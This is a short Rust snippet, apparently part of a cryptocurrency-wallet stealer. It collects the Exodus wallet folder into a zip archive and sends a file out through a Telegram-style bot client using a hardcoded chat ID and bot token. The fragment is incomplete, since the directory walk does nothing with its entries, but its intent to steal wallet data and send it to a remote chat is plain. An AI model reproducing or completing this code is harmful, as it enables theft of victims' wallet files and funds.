use walkdir::WalkDir;
use zip::ZipWriter;
const CHAT_ID: i64 = 7304091279;
fn collect() {
    let folder = "exodus.wallet";
    let mut zip = ZipWriter::new(std::fs::File::create("wallet.zip").unwrap());
    for entry in WalkDir::new(folder) { let _ = entry; }
    zip.start_file("wallet", Default::default()).unwrap();
}
async fn send(client: &reqwest::Client, path: &str) {
    let bot = Toxid::with_client(client.clone(), "bot-token", CHAT_ID.to_string());
    bot.send_file(path).await.unwrap();
}
